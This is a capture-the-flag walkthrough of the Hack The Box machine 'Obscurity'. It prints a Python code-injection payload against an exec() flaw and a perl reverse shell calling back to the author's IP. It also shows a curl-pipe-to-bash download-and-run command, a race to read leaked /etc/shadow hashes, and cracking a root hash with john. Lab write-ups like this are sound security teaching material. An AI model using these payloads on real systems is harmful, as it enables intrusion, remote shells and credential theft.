---
title: "Obscurity"
date: 2020-05-09T17:00:00+01:00
tags: []
---

![](/images/hackthebox/obscurity/info.png)
Obscurity is a medium difficulty Linux machine on Hack The Box in which we will
exploit two bad implementations of an HTTP and a SSH-like service.

## Information gathering
Let's run a port scan:
```
$ nmap -A -T4 10.10.10.168
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-30 19:33 EST
Nmap scan report for 10.10.10.168
Host is up (0.12s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sun, 01 Dec 2019 00:34:18
|     Server: BadHTTPServer
|     Last-Modified: Sun, 01 Dec 2019 00:34:18
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=11/30%Time=5DE30A8A%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sun,\x2001\x20Dec\x202
SF:019\x2000:34:18\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sun,\x2001
SF:\x20Dec\x202019\x2000:34:18\nContent-Length:\x204171\nContent-Type:\x20
SF:text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\
SF:"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>
SF:\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-
SF:scale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20n
SF:ame=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Temp
SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20s
SF:tylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/bo
SF:otstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-
SF:awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templ
SF:atemo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-targe
SF:t=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n
SF:<div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinne
SF:r-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x2
SF:0Sun,\x2001\x20Dec\x202019\x2000:34:18\nServer:\x20BadHTTPServer\nLast-
SF:Modified:\x20Sun,\x2001\x20Dec\x202019\x2000:34:18\nContent-Length:\x20
SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x2
SF:0html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\
SF:t<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20c
SF:ontent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20cont
SF:ent=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\n
SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
SF:ofile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styles
SF:heet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\
SF:"scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x2
SF:0section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"
SF:sk-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 8080 there's an HTTP server running, named `BadHTTPServer`. There's
this interesting message on the website:
![](/images/hackthebox/obscurity/dev.png)

Let's search for this *secret* directory:
```
$ ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -fc 404 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py

develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
```
Cool, found it! Let's take a look at the code:
{{< highlight python "linenos=table, hl_lines=138-139" >}}
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}


class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False

    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]

        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode,
        dateSent = dateSent, server = server,
        modified = modified, length = length,
        contentType = contentType, connectionType = connectionType,
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}
{{< /highlight >}}

It looks like it's the source code of the HTTP server running on the machine,
because it sends the `Server: BadHTTPServer` header.

We can straight off pinpoint a vulnerability on line 139. There's a call to
`exec` and we can control the content of the `path` variable, so we can inject
python code!

We can send something like:
`
';import subprocess;subprocess.call('<command>',shell=True);'"
`
so that the `info` variable will be:
```
output = 'Document: ;'import subprocess;subprocess.call('<command>',shell=True);''
```
And when it is passed to `exec` it will execute our command.

## Command injection
Let's try to get a ping from the machine. After listening with `tshark -i utun2
-Y icmp` let's make the request to ping us:
```
$ curl "10.10.10.168:8080/';import%20subprocess;subprocess.call('ping%20-c4%2010.10.14.81',shell=True);'"
<div id="main">
        <div class="fof">
                <h1>Error 404</h1>
                <h2>Document /';import subprocess;subprocess.call('ping -c4 10.10.14.81',shell=True);' could not be found</h2>
        </div>
</div>
```

Let's check if we received the ping:
```
$ tshark -i utun2 -Y icmp
Capturing on 'utun2'
    6  17:46:43,417023 10.10.10.168 → 10.10.14.81  ICMP 88
    7  17:46:43,417057  10.10.14.81 → 10.10.10.168 ICMP 88
    8  17:46:44,448178 10.10.10.168 → 10.10.14.81  ICMP 88
    9  17:46:44,448202  10.10.14.81 → 10.10.10.168 ICMP 88
   12  17:46:45,472229 10.10.10.168 → 10.10.14.81  ICMP 88
   13  17:46:45,472278  10.10.14.81 → 10.10.10.168 ICMP 88
   16  17:46:46,422246 10.10.10.168 → 10.10.14.81  ICMP 88
   17  17:46:46,422274  10.10.14.81 → 10.10.10.168 ICMP 88
```

And we did!

## Getting a reverse shell
Let's try to get a reverse shell now, but we can't use netcat on the machine
because it's compiled without `-c` and `-e` options, as we can see by piping the
result of `man` in out listener:
```
 There is no -c or -e option in this netcat, but you still can execute a command after con‐
     nection being established by redirecting file descriptors. Be cautious here because opening
     a port and let anyone connected execute arbitrary command on your site is DANGEROUS. If you
     really need to do this, here is an example:

     On ‘server’ side:

           $ rm -f /tmp/f; mkfifo /tmp/f
           $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

     On ‘client’ side:

           $ nc host.example.com 1234
           $ (shell prompt from host.example.com)
```

In order to avoid getting crazy with url encoding, we can start an HTTP server,
let's say on port 8080, and use it to remotely download a script and execute it
to get a reverse shell.

In this case, I am going to use `perl` to get a reverse shell, so let's start an
HTTP server with `python -m http.server 8080` and let's write our reverse shell
payload in a file:
```bash
#!/usr/bin/env bash
perl -e 'use Socket;$i="10.10.14.81";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Start the netcat listener with `nc -lnvp 1337` and let's make a request to
download the reverse shell script and execute it:
```
curl "10.10.10.168:8080/';import%20subprocess;subprocess.call('curl%20http://10.10.14.81:8000/shell.sh|/bin/bash',shell=True);'"
```

And after a second we should have it:
```
$ nc -lnkvp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.168.
Ncat: Connection from 10.10.10.168:53436.
$ whoami
www-data
```

## Further exploration

There's a user called `robert` and there are some file in it's home:
```
$ ls /home/robert
BetterSSH
check.txt
out.txt
passwordreminder.txt
SuperSecureCrypt.py
user.txt
```

This is `check.txt`:
```
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

`out.txt` and `passwordreminder.txt` are binary files, and here's
`SuperSecureCrypt.py`:
```python
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```

It's a simple cipher implementation that uses additions and modulos, and because
we have a cleartext in `check.txt` and a ciphertext in `out.txt`, we can recover
the key by applying the decrypt operation to them. So, after copying all the
files to our machine, we can use a simple script to get the password:
```python
#!/usr/bin/env python3
encrypted = open('out.txt', 'r', encoding='UTF-8').read()
clear = open('check.txt', 'r', encoding='UTF-8').read()
for e, c in zip(encrypted, clear):
    print(chr(ord(e) - ord(c) % 255), end='')
```

Let's run it:
```
$ ./decrypt.py
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
```

Now we can use the password to decrypt the `passwordreminder.txt` and we can use
the python script itself to decrypt it:
```
$ ./SuperSecureCrypt.py -k alexandrovich -i passwordreminder.txt -o password -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to password...
```

Let's check the output:
```
$ cat password
SecThruObsFTW
```

Trying the credenstials on SSH works, so let's check the flag:
```
robert@obscure:~$ wc -c user.txt
33 user.txt
```

## Privilege escalation

Let's examine now the other script, `BetterSSH`:
```python
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()

        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

It's a simple implementation of a SSH-like service, but it has a problem. It
parses `/etc/shadow` and copies the hashes in a randomly called file in
`/tmp/SSH`, which will have default permissions so we can read it as any user.

And also, we can run it with `sudo`, in order to be able to read the shadow file
inside the script:
```
robert@obscure:/tmp/SSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

Because the file in `/tmp/SSH` will get deleted almost immediately, let's use a
simple while loop to read all the files in the directory:
```
robert@obscure:/tmp/SSH$ while true; do cat * 2>/dev/null; done
```

Let's run the script:
```
robert@obscure:~/BetterSSH$ sudo python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: SecThruObsFTW
Authed!
robert@Obscure$
```

Let's check the output of the `cat` inside the loop:
```
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7




robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```
Cool! We have the hashes! We already know robert's password, so let's copy the
other to a file and use `john` to crack it:
```
$ john --wordlist=rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (?)
1g 0:00:00:00 DONE (2020-05-07 20:27) 6.666g/s 3413p/s 3413c/s 3413C/s angelo..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can now use `su` to escalate to root and get the flag:
```
root@obscure:~# wc -c root.txt
33 root.txt
```

Lessons learned: don't reinvent the wheel!

Thanks for reading!
